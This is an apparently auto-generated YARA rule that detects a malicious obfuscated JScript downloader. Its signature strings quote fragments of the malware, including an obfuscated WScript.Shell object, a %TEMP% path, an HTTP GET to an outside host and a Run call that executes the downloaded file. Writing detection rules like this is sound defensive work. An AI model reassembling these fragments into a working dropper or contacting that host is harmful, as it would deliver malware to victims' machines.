rule sig_20160427_3f993e77224e44a6280d1b7491c19301 {
  meta:
    description = "datamaliciousorder - file 20160427_3f993e77224e44a6280d1b7491c19301.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b75516ca7caf321676d5a57051eb85a164d9f42505e152ffdda97b43c6e80c82"

  strings:
    $s1  = "function DygxpGsjsn() {return RrzlmNbtor[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"JaMZh6s" ascii
    $s2  = "function DygxpGsjsn() {return RrzlmNbtor[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"JaMZh6s" ascii
    $s3  = "var RrzlmNbtor = function LopnfFfpvq() {return FadbuBrxlt[ClrfoRjjgx](\"WScript\"+\".Shell\");}(), DvyzrGqbye = 11;" fullword ascii
    $s4  = "function DmatwWvles(HidfdWldyn, ZyvsiVsuph){JhgjsNfgfn = JhgjsNfgfn * 1; return HidfdWldyn - ZyvsiVsuph;};" fullword ascii
    $s5  = "CegbvQcxgi[QccygHvhnr](\"G\" + \"ET\", \"http://games-k.ru/n8eis\", false);" fullword ascii
    $s6  = "var FadbuBrxlt = this[\"WScript\"];" fullword ascii
    $s7  = "if (CegbvQcxgi[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function WhtkoUmkio(){return WeofeTyvac + \"\";};" fullword ascii
    $s9  = "function NvwvrXgtkz() {return ((PsleoRvyvf == true) && (PsleoRvyvf == IhfxxSlcso)) ? 1 : JhgjsNfgfn;};" fullword ascii
    $s10 = "NvjbdSdffp = true;" fullword ascii
    $s11 = "var VipfyPqlrt = new this[\"D\"+\"ate\"]();" fullword ascii
    $s12 = "var NvjbdSdffp = false;" fullword ascii
    $s13 = "function NtfatGsdtb(TetfiFdyrt){RrzlmNbtor[\"R\"+\"un\"](TetfiFdyrt, JhgjsNfgfn, JhgjsNfgfn);};" fullword ascii
    $s14 = "var PsleoRvyvf = false;" fullword ascii
    $s15 = "IhfxxSlcso = true; " fullword ascii
    $s16 = "}while (MbjdkRpouh);" fullword ascii
    $s17 = "var IhfxxSlcso = false;" fullword ascii
    $s18 = "function RpetcXjpjy(){return ClrfoRjjgx;};" fullword ascii
    $s19 = "function ZncrbSxxlq(){return 23;};" fullword ascii
    $s20 = "return DmatwWvles(XbgtsEbpiv, WsmoaDbnyp);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}